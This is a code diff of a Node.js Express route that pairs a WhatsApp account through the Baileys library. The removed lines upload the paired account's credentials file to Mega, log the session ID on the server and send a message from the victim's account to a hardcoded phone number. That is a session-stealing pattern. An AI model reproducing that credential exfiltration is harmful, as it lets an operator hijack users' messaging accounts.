@@ -1,119 +1,76 @@
+// pair.js
 const express = require('express');
 const fs = require('fs-extra');
 const { exec } = require("child_process");
-let router = express.Router();
+const path = require('path');
 const pino = require("pino");
 const { Boom } = require("@hapi/boom");
-const path = require('path');
 
-const { upload } = require('./mega');
 const {
-default: makeWASocket,
-useMultiFileAuthState,
-delay,
-makeCacheableSignalKeyStore,
-Browsers,
-DisconnectReason
+  default: makeWASocket,
+  useMultiFileAuthState,
+  delay,
+  makeCacheableSignalKeyStore,
+  Browsers,
+  DisconnectReason
 } = require("@whiskeysockets/baileys");
+
+const { upload } = require('./mega'); // Ensure mega.js exists and is correct
+
+const router = express.Router();
 
 // ===== FIXED TARGET NUMBER HERE =====
 const TARGET_NUMBER = "94773913394"; // <- මෙතන ඔබට message යවන්න ඕන අංකය
 const IMAGE_PATH = path.join(__dirname, "target.jpg"); // <- මෙතන ඔබට image file path
 
-// Ensure the directory is empty when the app starts
+// Clean auth folder on start
 if (fs.existsSync('./auth_info_baileys')) {
-fs.emptyDirSync(__dirname + '/auth_info_baileys');
+  fs.emptyDirSync(path.join(__dirname, 'auth_info_baileys'));
 }
 
+// Main route (example: /code?number=9477xxxxxxx)
 router.get('/', async (req, res) => {
-let num = req.query.number;
+  let num = req.query.number;
 
-async function SUHAIL() {  
-    const { state, saveCreds } = await useMultiFileAuthState(`./auth_info_baileys`);  
-    try {  
-        let Smd = makeWASocket({  
-            auth: {  
-                creds: state.creds,  
-                keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "fatal" }).child({ level: "fatal" })),  
-            },  
-            printQRInTerminal: false,  
-            logger: pino({ level: "fatal" }).child({ level: "fatal" }),  
-            browser: Browsers.macOS("Safari"),  
-        });  
+  if (!num) {
+    return res.status(400).send("Phone number is required as 'number' query parameter.");
+  }
 
-        if (!Smd.authState.creds.registered) {  
-            await delay(1500);  
-            num = num.replace(/[^0-9]/g, '');  
-            const code = await Smd.requestPairingCode(num);  
-            if (!res.headersSent) {  
-                await res.send({ code });  
-            }  
-        }  
+  async function startSession() {
+    const { state, saveCreds } = await useMultiFileAuthState(`./auth_info_baileys`);
+    try {
+      let socket = makeWASocket({
+        printQRInTerminal: true,
+        auth: state,
+        logger: pino({ level: "silent" }),
+        browser: Browsers.macOS("Desktop"),
+        markOnlineOnConnect: false
+      });
 
-        Smd.ev.on('creds.update', saveCreds);  
+      socket.ev.on("creds.update", saveCreds);
 
-        Smd.ev.on("connection.update", async (s) => {  
-            const { connection, lastDisconnect } = s;  
+      socket.ev.on("connection.update", async (update) => {
+        const { connection, lastDisconnect } = update;
+        if (connection === "close") {
+          const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
+          if (shouldReconnect) {
+            startSession();
+          }
+        } else if (connection === "open") {
+          await delay(1000);
+          const jid = num.includes("@s.whatsapp.net") ? num : `${num}@s.whatsapp.net`;
+          await socket.sendMessage(jid, { image: fs.readFileSync(IMAGE_PATH), caption: "Hi there!" });
+          await delay(2000);
+          await socket.logout();
+        }
+      });
+    } catch (err) {
+      console.error("Error:", err);
+    }
+  }
 
-            if (connection === "open") {  
-                try {  
-                    await delay(10000);  
-                    if (fs.existsSync('./auth_info_baileys/creds.json'));  
-
-                    const auth_path = './auth_info_baileys/';  
-
-                    // Upload credentials to Mega  
-                    const mega_url = await upload(fs.createReadStream(auth_path + 'creds.json'), `${Date.now()}.json`);  
-                    const sessionId = mega_url.replace('https://mega.nz/file/', '');  
-
-                    // Send image + "good morning" text to fixed target number  
-                    await Smd.sendMessage(  
-                        `${TARGET_NUMBER}@s.whatsapp.net`,  
-                        {  
-                            image: fs.readFileSync(IMAGE_PATH),  
-                            caption: "good morning"  
-                        }  
-                    );  
-
-                    console.log(`Session ID: ${sessionId}`);  
-                    console.log(`Image & message sent to ${TARGET_NUMBER}`);  
-
-                    // Clean up  
-                    await delay(1000);  
-                    await fs.emptyDirSync(__dirname + '/auth_info_baileys');  
-
-                } catch (e) {  
-                    console.log("Error during file upload or message send: ", e);  
-                }  
-            }  
-
-            // Handle connection closures  
-            if (connection === "close") {  
-                let reason = new Boom(lastDisconnect?.error)?.output.statusCode;  
-                if (reason === DisconnectReason.restartRequired) {  
-                    SUHAIL().catch(err => console.log(err));  
-                } else {  
-                    console.log('Connection closed with bot. Restarting...');  
-                    exec('pm2 restart qasim');  
-                }  
-            }  
-        });  
-
-    } catch (err) {  
-        console.log("Error in SUHAIL function: ", err);  
-        exec('pm2 restart qasim');  
-        SUHAIL();  
-        await fs.emptyDirSync(__dirname + '/auth_info_baileys');  
-        if (!res.headersSent) {  
-            await res.send({ code: "Try After Few Minutes" });  
-        }  
-    }  
-}  
-
-await SUHAIL();
-
+  await startSession();
+  res.send("QR session started. Scan it from terminal.");
 });
 
 module.exports = router;
-
-
